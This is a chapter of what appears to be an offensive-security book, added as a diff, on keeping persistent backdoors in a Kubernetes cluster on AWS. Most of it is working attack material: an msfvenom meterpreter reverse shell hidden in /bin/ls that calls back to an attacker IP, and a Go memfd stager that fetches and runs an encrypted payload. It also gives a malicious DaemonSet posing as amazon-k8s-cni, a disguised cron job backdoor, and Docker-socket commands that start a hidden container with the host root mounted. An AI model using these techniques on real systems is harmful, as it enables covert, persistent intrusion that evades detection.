@@ -1,0 +1,276 @@
+<html><head></head><body>
+<section>
+<header>
+<h1 class="chapter">
+<span class="ChapterNumber"><span epub:type="pagebreak" title="153" id="Page_153"/>9</span><br/>
+<span class="ChapterTitle">Sticky Shell</span></h1>
+</header>
+<figure class="opener">
+<img src="image_fi/book_art/chapterart.png" alt=""/>
+</figure>
+<p class="ChapterIntro">Persistence takes on a whole new dimension when dealing with a volatile and renewable infrastructure like Kubernetes. Containers and nodes tend to be treated as immutable and disposable objects that can vanish anytime, anywhere.</p>
+<p>This volatility is further aggravated on AWS machines by the use of special types called <em>spot instances</em>. At about 40 percent of the regular price, companies can spawn a spot instance of almost any type available. The catch is that AWS has the power to reclaim the machine whenever it needs the compute power back. While this setup seems ideal for a Kubernetes cluster, where containers can be automatically moved to healthy machines and new nodes respawned in a matter of seconds, it does pose new challenges for reliable long-term backdoors.</p>
+<p>Persistence used to be about backdooring binaries, running secret shells on machines, and planting Secure Shell (SSH) keys. None of these options provide stable, long-term access in a world where the average lifetime of a machine is a few hours.</p>
+<p><span epub:type="pagebreak" title="154" id="Page_154"/>The good news is using 100 percent spot instances for a cluster poses such a heavy risk that no serious company sets up such clusters—at least not to process critical workloads. If AWS suddenly spikes in reclaims, the cluster might fail to scale fast enough to meet customer demand. For this reason, a common strategy for cost-effective resilience is to have a stable part of critical workloads scheduled on a minimal base of regular instances and absorb traffic fluctuations with spot instances.</p>
+<p>A lazy way to backdoor such a fluctuating infrastructure is to locate this set of precious machines—they’re usually the oldest ones in the cluster—and backdoor them using the old-fashioned methods. We could set up a cron job that regularly pulls and executes a reverse shell. We could use <em>binary planting</em>, where we replace common tools like <code>ls</code>, Docker, and SSHD with variants that execute distant code, grant root privileges, and perform other mischievous actions. We could insert a <em>rootkit</em>, which counts as any modification to the system (libraries, kernel structures, and so on) that allows or maintains access (check out a sample rootkit on Linux at <a href="https://github.com/croemheld/lkm-rootkit/" class="LinkURL">https://github.com/croemheld/lkm-rootkit/</a>).</p>
+<p>In <a href="#listing9-1" id="listinganchor9-1">Listing 9-1</a>, we retrieve machines and order them by their creation timestamp.</p>
+<pre><code>shell&gt; <code class="bold">./kubectl get nodes –sort-by=.metadata.creationTimestamp</code>
+
+Name
+ip-192-168-162-15.eu-west-1....   Ready  14 days
+ip-192-168-160-34.eu-west-1....   Ready  14 days
+ip-192-168-162-87.eu-west-1....   Ready  14 days
+ip-192-168-162-95.eu-west-1....   Ready  12 days
+ip-192-168-160-125.eu-west-1....  Ready   9 days
+<var>--snip--</var></code></pre>
+<p class="CodeListingCaption"><a id="listing9-1">Listing 9-1</a>: Finding the oldest nodes to locate the stable section of the cluster</p>
+<p>Each node supports different services, so backdooring a dozen of these nodes should give us at least a few days of guaranteed access. The shell will then automatically disappear with the node, burying any evidence of our shenanigans. It’s the perfect crime.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	Well, almost all evidence will be buried. Not all artifacts are solely located on the system, so we could leave traces through virtual private cloud (VPC) flow logs capturing network packets, CloudTrail logging most API calls, and so on.</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p>But what if a few days isn’t enough time to find a way to Gretsch Politico’s network? Can we persist longer somehow? We are, after all, in a setup that could adapt and heal itself. Wouldn’t it be magical if it healed our backdoor with it?</p>
+<p>If we start thinking of our backdoor as a container or a pod, then maybe we can leverage the dark wizardry of Kubernetes to ensure that at least one copy is always up and running somewhere. The risk of such an ambition <span epub:type="pagebreak" title="155" id="Page_155"/>cannot be taken lightly, however. Kubernetes offers a ridiculous level of insights and metrics about all its components, so using an actual Kubernetes pod for our backdoor will make it a bit tricky to stay under the radar.</p>
+<p>Persistence is always a game of trade-offs. Should we sacrifice stealth for more durable access or keep a very low profile and accept losing our hard-won shell at the slightest turbulence? To each their own opinion about the subject, which will depend on several factors like their confidence in the anonymity of the attacking infrastructure, the target’s security level, their risk appetite, and so forth.</p>
+<p>This ostensibly impossible quandary has one obvious solution, though: multiple backdoors with different properties. We’ll have both a stable-yet-somewhat-plain backdoor and the stealthy-but-volatile shell. The first backdoor will consist of a pod cleverly hidden in plain sight that acts as our main center of operations. The pod will regularly beacon back home, looking for commands to execute. This also provides direct internet connection, which our current shell lacks. Whenever it gets destroyed for whatever reason, Kube will hurry to bring it back to life. Parallel to the first backdoor, we’ll drop another, stealthier program that hibernates until we send a predefined signal. This gives us a secret way back into the system should our first backdoor get busted by a curious admin.</p>
+<p>These multiple backdoors should not share any indicator of compromise: they will contact different IPs, use different techniques, run different containers, and be completely isolated from each other. An investigator who finds one seed with certain attributes should not be able to leverage this information to find other backdoors. The demise of one should not, in theory, put the others at risk.</p>
+<h2 id="h1-501263c09-0001">Stable Access</h2>
+<p class="BodyFirst">The stable backdoor will be able to, for instance, run on a select few of the hundreds of nodes available. This rogue container will be a slim image that loads and executes a file at boot time. We’ll use <em>Alpine</em>, a minimal distribution of about 5MB commonly used to spin up containers.</p>
+<p>In <a href="#listing9-2" id="listinganchor9-2">Listing 9-2</a>, we start by writing the Dockerfile to download and run an arbitrary file within an Alpine container.</p>
+<pre><code>#Dockerfile
+
+FROM alpine
+
+CMD ["/bin/sh", "-c",
+"wget https://amazon-cni-plugin-essentials.s3.amazonaws.com/run
+-O /root/run &amp;&amp; chmod +x /root/run &amp;&amp; /root/run"]</code></pre>
+<p class="CodeListingCaption"><a id="listing9-2">Listing 9-2</a>: A Dockerfile to build a container that downloads and runs an executable after booting</p>
+<p><span epub:type="pagebreak" title="156" id="Page_156"/>Since MXR Ads is such a big fan of S3, we pull the future binary from an S3 bucket we own, which we’ve treacherously called amazon-cni-plugin-essentials (more on the name later).</p>
+<p>The binary (also called an <em>agent</em>) can be any of your favorite custom or boilerplate reverse shells. Some hackers may not even mind running a vanilla meterpreter agent on a Linux box. As stated in Chapter 1, the attacking framework we’ve built is reliable and stable, and few companies bother to invest in costly endpoint detection response solutions to protect their Linux servers, especially in ephemeral machines in a Kubernetes cluster. That makes off-the-shelf exploitation frameworks like Metasploit a reasonable option.</p>
+<p>Nevertheless, we’ll stay on the side of caution and take a few seconds to build a reliable payload unlikely to trip over hidden wires.</p>
+<p>We head to our lab and generate a stageless vanilla HTTPS meterpreter. A stageless payload is one that is fully self-contained and doesn’t need to download additional code from the internet to start. The meterpreter is directly injected into the executable <em>.text</em> section of the ELF/PE binary of our choosing (provided the template file has enough space for it). In <a href="#listing9-3" id="listinganchor9-3">Listing 9-3</a>, we choose the <em>/bin/ls</em> binary as a template and sneak the reverse shell into it.</p>
+<pre><code>root@Point1:~/# <b>docker run -it phocean/msf ./msfvenom -p \</b>
+<b>linux/x64/meterpreter_reverse_https \</b>
+<b>LHOST=54.229.96.173 \</b>
+<b>LURI=/msf \</b>
+<b>-x /bin/ls</b>
+<b>LPORT=443 -f elf &gt; /opt/tmp/stager</b>
+
+[*] Writing 1046512 bytes to /opt/tmp/stager...</code></pre>
+<p class="CodeListingCaption"><a id="listing9-3">Listing 9-3</a>: Embedding a meterpreter inside a regular <em>/bin/ls</em> executable</p>
+<p>Simple enough. Now, instead of running this file from disk like any classic binary, we would like to trigger its execution exclusively from memory to thwart potential security solutions. Had the payload been a regular shellcode instead of a literal binary file, we would only have needed to copy it to a read/write/execute memory page and then jump to the first byte of the payload.</p>
+<p>However, since our <code>meterpreter_reverse_https</code> payload produces a full ELF binary file, reflectively loading it in memory requires a bit of extra work: we have to manually load imported DLLs and resolve local offsets. Check the resources at the end of the chapter for more on how to handle this. Thankfully, Linux 3.17 introduced a syscall tool that provides a much quicker way of achieving the same result: <em>memfd</em>.</p>
+<p>This syscall creates a virtual file that lives entirely in memory and behaves like any regular disk file. Using the virtual file’s symbolic link <em>/proc/self/fd/&lt;id&gt;</em>, we can open the virtual file, alter it, truncate it, and, of course, execute it!</p>
+<p><span epub:type="pagebreak" title="157" id="Page_157"/>Here are the five main steps to carry out this operation:</p>
+<ol class="decimal">
+<li value="1">Encrypt the vanilla meterpreter payload using an XOR operation.</li>
+<li value="2">Store the result in an S3 bucket.</li>
+<li value="3">Craft a stager that will download the encrypted payload over HTTPS on the target machine.</li>
+<li value="4">Decrypt the payload in memory and initialize an “anonymous” file using the memfd syscall.</li>
+<li value="5">Copy the decrypted payload into this memory-only file and then execute it.</li>
+</ol>
+<p><a href="#listing9-4" id="listinganchor9-4">Listing 9-4</a> is an abridged walkthrough of the main steps our stager will take—as usual, the full code is hosted on GitHub.</p>
+<pre><code>func main() {
+  // Download the encrypted meterpreter payload
+  data, err := getURLContent(path)
+
+  // Decrypt it using XOR operation
+  decryptedData := decryptXor(data, []byte("verylongkey"))
+
+  // Create an anonymous file in memory
+  mfd, err := memfd.Create()
+
+  // Write the decrypted payload to the file
+  mfd.Write(decryptedData)
+
+  // Get the symbolic link to the file
+  filePath := fmt.Sprintf("/proc/self/fd/%d", mfd.Fd())
+
+  // Execute the file
+  cmd := exec.Command(filePath)
+  out, err := cmd.Run()
+}</code></pre>
+<p class="CodeListingCaption"><a id="listing9-4">Listing 9-4</a>: High-level actions of the stager</p>
+<p>That’s about it. We don’t need to do any obscure offset calculations, library hot-loading, patching of procedure linkage table (PLT) sections, or other hazardous tricks. We have a reliable stager that executes a file exclusively in memory and that is guaranteed to work on any recent Linux distribution.</p>
+<p>We compile the code and then upload it to S3:</p>
+<pre><code>root@Point1:<b>opt/tmp/# aws s3api put-object \</b>
+<b>--key run \</b>
+<b>--bucket amazon-cni-plugin-essentials \</b>
+<b>--body ./run</b></code></pre>
+<p><span epub:type="pagebreak" title="158" id="Page_158"/>Finally, to further enhance the web of deceit, when we build the container’s image and push it to our own AWS ECR registry (ECR is the equivalent of Docker Hub on AWS), we do so under the guise of a legitimate Amazon container, amazon-k8s-cni:</p>
+<pre><code>root@Point1:~/# <b>docker build \</b>
+<b>-t 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3 .</b>
+
+Successfully built be905757d9aa
+Successfully tagged 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3
+
+# Authenticate to ECR
+root@Point1:~/# <b>$(aws ecr get-login --no-include-email --region eu-west-1)</b>
+root@Point1:~/# <b>docker push 886477354405.dkr.ecr.eu-west-1.amazonaws.com/amazon-k8s-cni:v1.5.3</b></code></pre>
+<p>The names of the fake container (amazon-k8s-cni) and S3 bucket (amazon-cni-plugin-essentials) are not arbitrary choices. EKS runs a copy of a similar container on every single node to manage the network configuration of pods and nodes, as we can see if we grab a list of pods from any running cluster:</p>
+<pre><code>shell&gt; <b>kubectl get pods -n kube-system | grep aws-node</b>
+aws-node-rb8n2            1/1     Running   0          7d
+aws-node-rs9d1            1/1     Running   0          23h
+<var>--snip--</var></code></pre>
+<p>These pods named aws-node-<em>xxxx</em> are running the official <code>amazon-k8s-cni</code> image hosted on AWS’s own repository.</p>
+<p>These pods were created by a <em>DaemonSet</em> object, a Kubernetes resource that maintains at least one copy of a given pod constantly running on all (or some) nodes. Each of these aws-node pods is assigned a service account with read-only access to all namespaces, nodes, and pods. And to top it all off, they all automatically mount <em>/var/run/docker.sock</em>, giving them root privileges on the host. It is the perfect cover.</p>
+<p>We will spawn an almost exact copy of this DaemonSet. Unlike the real one, however, this new DaemonSet will fetch its <code>amazon-k8s-cni</code> pod image from our own ECR repository. A DaemonSet runs by default on all machines. We do not want to end up with thousands of reverse shells phoning home at once, so we will only target a few nodes—for instance, the three bearing the “kafka-broker-collector” label. This is a good population size for our evil DaemonSet.</p>
+<p>The following command displays machine names along with their labels:</p>
+<pre><code>shell&gt; <b>kubectl get nodes --show-labels</b>
+
+ip-192-168-178-150.eu-west-1.compute.internal
+
+service=kafka-broker-collector,
+beta.kubernetes.io/arch=amd64,
+beta.kubernetes.io/instance-type=t2.small, beta.kubernetes.io/os=linux
+
+<span epub:type="pagebreak" title="159" id="Page_159"/>ip-192-168-178-150.eu-west-1.compute.internal
+<var>--snip--</var>
+ip-192-168-178-150.eu-west-1.compute.internal
+<var>--snip--</var></code></pre>
+<p>We have chosen our targets. Our payload is locked and ready. The next step is to create the DaemonSet object.</p>
+<p>No need to go looking for the YAML definition of a DaemonSet; we just dump the DaemonSet used by the legitimate aws-node, update the container image field so it points to our own repository, alter the display name (aws-node-cni instead of aws-node), change the container port to avoid conflict with the existing DaemonSet, and finally add the label selector to match kafka-broker-collector. In <a href="#listing9-5" id="listinganchor9-5">Listing 9-5</a>, we resubmit the newly changed file for scheduling.</p>
+<pre><code>shell&gt; <b>kubectl get DaemonSet aws-node -o yaml -n kube-system &gt; aws-ds-manifest.yaml</b>
+
+# Replace the container image with our own image
+shell&gt; <b>sed -E "s/image: .*/image: 886477354405.dkr.ecr.eu-west-1.amazonaws.com/\</b>
+<b>amazon-k8s-cni:v1.5.3/g" -i aws-ds-manifest.yaml</b>
+
+# Replace the name of the DaemonSet
+shell&gt; <b>sed "s/ name: aws-node/ name: aws-node-cni/g" -i aws-ds-manifest.yaml</b>
+
+
+# Replace the host and container port to avoid conflict
+shell&gt; <b>sed -E "s/Port: [0-9]+/Port: 12711/g" -i aws-ds-manifest.yaml</b>
+
+# Update the node label key and value
+shell&gt; <b>sed "s/ key: beta.kubernetes.io\/os/ key: service/g" -i aws-ds-manifest.yaml</b>
+
+shell&gt; <b>sed "s/ linux/ kafka-broker-collector/g" -i aws-ds-manifest.yaml</b></code></pre>
+<p class="CodeListingCaption"><a id="listing9-5">Listing 9-5</a>: Creating our own fake DaemonSet</p>
+<p>After a few <code>sed</code> commands, we have our updated manifest ready to be pushed to the API server.</p>
+<p>Meanwhile, we head back to our Metasploit container to set up a listener serving a payload of type <code>meterpreter_reverse_https</code> on port 443, as shown next. This payload type is, of course, the same one we used in the <code>msfvenom</code> command at the beginning of this chapter:</p>
+<pre><code>root@Point1:~/# <b>docker ps</b>
+CONTAINER ID      IMAGE          COMMAND
+8e4adacc6e61      phocean/msf    "/bin/sh -c \"init.sh\""
+
+root@Point1:~/# <b>docker attach 8e4adacc6e61</b>
+root@fcd4030:/opt/metasploit-framework# <b>./msfconsole</b>
+msf &gt; <b>use exploit/multi/handler</b>
+msf multi/handler&gt; <b>set payload linux/x64/meterpreter_reverse_https</b>
+msf multi/handler&gt; <b>set LPORT 443</b>
+msf multi/handler&gt; <b>set LHOST 0.0.0.0</b>
+msf multi/handler&gt; <b>set LURI /msf</b>
+<span epub:type="pagebreak" title="160" id="Page_160"/>msf multi/handler&gt; <b>set ExitOnSession false</b>
+msf multi/handler&gt; <b>run -j</b>
+[*] Exploit running as background job 3</code></pre>
+<p>We push this updated manifest to the cluster, which will create the DaemonSet object along with the three reverse shell containers:</p>
+<pre><code>shell&gt; <b>kubectl -f apply -n kube-system aws-ds-manifest.yaml</b>
+daemonset.apps/aws-node-cni created
+
+# Metasploit container
+
+[*] https://0.0.0.0:443 handling request from 34.244.205.187;
+meterpreter &gt; <b>getuid</b>
+Server username: uid=0, gid=0, euid=0, egid=0</code></pre>
+<p>Awesome. Nodes can break down and pods can be wiped out, but so long as there are nodes bearing the label kafka-collector-broker, our evil containers will be scheduled on them time and time again, resurrecting our backdoor. After all, who will dare question Amazon-looking pods obviously related to a critical component of the EKS cluster? Security by obscurity may not be a winning defense strategy, but it’s a golden rule in the offensive world.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+<h2><span class="NoteHead">NOTE</span></h2>
+<p>	We can achieve the same resilience using a ReplicaSet object instead of a DaemonSet. A <em>ReplicaSet</em> ensures there is always a fixed number of copies of a given pod. We can configure this ReplicaSet to mimic the attributes and labels of the aws-node DaemonSet. The advantage of this method is that we can literally name the pods aws-node instead of aws-node-cni since they will belong to a different Kubernetes object (ReplicaSet instead of DaemonSet).</p>
+<div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<h2 id="h1-501263c09-0002">The Stealthy Backdoor</h2>
+<p class="BodyFirst">Our stable backdoor is very resilient and will survive node termination, but it’s a bit loud. The pod and DaemonSet are constantly running and visible on the cluster. We therefore complement this backdoor with a stealthier one that only fires up occasionally.</p>
+<p>We set up a cron job at the cluster level that runs every day at 10 <span class="KeyCaps">AM</span> to bring a pod to life. We’ll use a different AWS account than the one present in the DaemonSet to make sure we’re not sharing data or techniques between our backdoors. <a href="#listing9-6" id="listinganchor9-6">Listing 9-6</a> shows the manifest file of the cron job.</p>
+<pre><code>apiVersion: batch/v1beta1
+kind: CronJob
+metadata:
+  name: metrics-collect
+spec:
+  schedule: "0 10 * * *"
+  jobTemplate:
+<span epub:type="pagebreak" title="161" id="Page_161"/>    spec:
+      template:
+        spec:
+          containers:
+          - name: metrics-collect
+            image: 882347352467.dkr.ecr.eu-west-1.amazonaws.com/amazon-metrics-collector
+            volumeMounts:
+            - mountPath: /var/run/docker.sock
+              name: dockersock
+          volumes:
+          - name: dockersock
+            hostPath:
+              path: /var/run/docker.sock
+          restartPolicy: Never</code></pre>
+<p class="CodeListingCaption"><a id="listing9-6">Listing 9-6</a>: The cron job for our stealthy backdoor</p>
+<p>This cron job loads the <code>amazon-metrics-collector</code> image from yet another AWS account we control. This Docker image has a thicker structure and may even pass for a legit metrics job (see <a href="#listing9-7" id="listinganchor9-7">Listing 9-7</a>).</p>
+<pre><code># Dockerfile
+
+FROM debian: buster-slim
+
+RUN apt update &amp;&amp; apt install -y git make
+RUN apt install -y prometheus-varnish-exporter
+COPY init.sh /var/run/init.sh
+
+ENTRYPOINT ["/var/run/init.sh"]</code></pre>
+<p class="CodeListingCaption"><a id="listing9-7">Listing 9-7</a>: A Dockerfile installing a number of packages and executing a script on startup</p>
+<p>Behind the façade of useless packages and dozens of dummy lines of code, deep inside <em>init.sh</em>, we place an instruction that downloads and executes our custom script hosted on S3. At first, this remote script will be a harmless dummy <code>echo</code> command. The moment we want to activate this backdoor to regain access to the system, we overwrite the file on S3 with our custom meterpreter. It’s a sort of dormant shell that we only use in case of emergency.</p>
+<p>This setup, however, will not completely solve the original problem of visibility. Once we activate our shell, we will have a pod constantly running on the system, visible to every Kube admin.</p>
+<p>One optimization is to avoid executing our custom stager directly on the foreign container metrics-collector pod. Instead, we will use this pod to contact the Docker socket that we so conveniently mounted and instruct it to start yet another container on the host, which will in time load the meterpreter agent. The metrics-collector pod, having done its job, can gracefully terminate, while our shell remains running unhindered in its own second container.</p>
+<p><span epub:type="pagebreak" title="162" id="Page_162"/>This second container will be completely invisible to Kubernetes since it is not attached to an existing object like a ReplicaSet or DaemonSet, but was defiantly created by Docker on a node. This container will silently continue running in privileged mode with minimal supervision. <a href="#listing9-8" id="listinganchor9-8">Listing 9-8</a> gives the three <code>curl</code> commands to pull, create, and start such a container through the Docker API. This script should be loaded and executed by the amazon-metrics-collector container we defined earlier.</p>
+<pre><code># Pull the image from the ECR registry
+curl \
+  --silent \
+  --unix-socket /var/run/docker.sock \
+  "http://docker/images/create?fromImage=881445392307.dkr.ecr.eu-west\
+  -1.amazonaws.com/pause-amd64" \
+  -X POST
+
+# Create the container from the image and mount the / directory
+curl \
+  --silent \
+  --unix-socket /var/run/docker.sock \
+  "http://docker/containers/create?name=pause-go-amd64-4413" \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{ "Image": "881445392307.dkr.ecr.eu-west-1.amazonaws.com/pause-amd64",\
+  "Volumes": {"/hostos/": {}},"HostConfig": {"Binds": ["/:/hostos"]}}'
+
+# Start the container
+curl \
+  --silent \
+  --unix-socket /var/run/docker.sock \
+  "http://docker/containers/pause-go-amd64-4413/start" \
+  -X POST \
+  -H "Content-Type: application/json" \
+  --output /dev/null \
+  --write-out "%{http_code}"</code></pre>
+<p class="CodeListingCaption"><a id="listing9-8">Listing 9-8</a>: A script to pull a new Docker image, create the container, and start it</p>
+<p>To further conceal our rogue container, we smuggle it among the many <em>pause</em> <em>containers</em> that are usually running on any given node. The pause container plays a key role in the Kubernetes architecture, as it’s the container that inherits all the namespaces assigned to a pod and shares them with the containers inside. There are as many pause containers as there are pods, so one more will hardly raise an eyebrow.</p>
+<aside epub:type="sidebar">
+<div class="top hr"><hr/></div>
+<section class="note">
+	Kube has a resource called a <em>mutating webhook</em> that patches pod manifests on the fly to inject containers, volumes, and so on. It’s tricky to configure but can be lethal to achieve persistence. However, we need the cluster to be at least version 1.15 to reliably weaponize the pods. See the <em>Medium</em> article “Writing a Very Basic Kubernetes Mutating Admission Webhook” by Alex Leonhardt for practical information. <div class="bottom hr"><hr/></div>
+</section>
+</aside>
+<p><span epub:type="pagebreak" title="163" id="Page_163"/>At this stage, we have a pretty solid foothold on the Kubernetes cluster. We could go on spinning processes on random nodes in case someone destroys our Kube resources, but hopefully by that time we’ll already have finished our business anyway.</p>
+<h2 id="h1-501263c09-0003">Resources</h2>
+<ul>
+<li>For more information about meterpreter payloads, search for the article “Deep Dive into Stageless Meterpreter Payloads” by OJ Reeves on <a href="https://blog.rapid7.com/" class="LinkURL">https://blog.rapid7.com/</a>.</li>
+<li>For a thorough article about the power of <code>memcpy</code> and <code>mprotect</code> for shellcode execution, see “Make Stack Executable Again” by Shivam Shrirao: <a href="http://bit.ly/3601dxh" class="LinkURL">http://bit.ly/3601dxh</a>.</li>
+<li>The ReflectiveELFLoader by @nsxz provides a proof of concept: <a href="https://github.com/nsxz/ReflectiveELFLoader/" class="LinkURL">https://github.com/nsxz/ReflectiveELFLoader/</a>. The code is well documented but requires some knowledge of ELF headers; see <a href="https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267/" class="LinkURL">https://0x00sec.org/t/dissecting-and-exploiting-elf-files/7267/</a>.</li>
+<li>A compilation of memory-only execution methods on Linux can be found at <a href="http://bit.ly/35YMiTY" class="LinkURL">http://bit.ly/35YMiTY</a>.</li>
+<li>Memfd was introduced in Linux kernel 3.17. See the manual page for<em> </em><code>memfd_create</code>: <a href="http://bit.ly/3aeig27" class="LinkURL">http://bit.ly/3aeig27</a>.</li>
+<li>For more information about DaemonSets, see the Kubernetes documentation:<em> </em><a href="http://bit.ly/2TBkmD8" class="LinkURL">http://bit.ly/2TBkmD8</a>.</li>
+<li>For help with Docker, see the API docs: <a href="https://dockr.ly/2QKr1ck" class="LinkURL">https://dockr.ly/2QKr1ck</a>.</li>
+</ul>
+</section>
+</body></html>
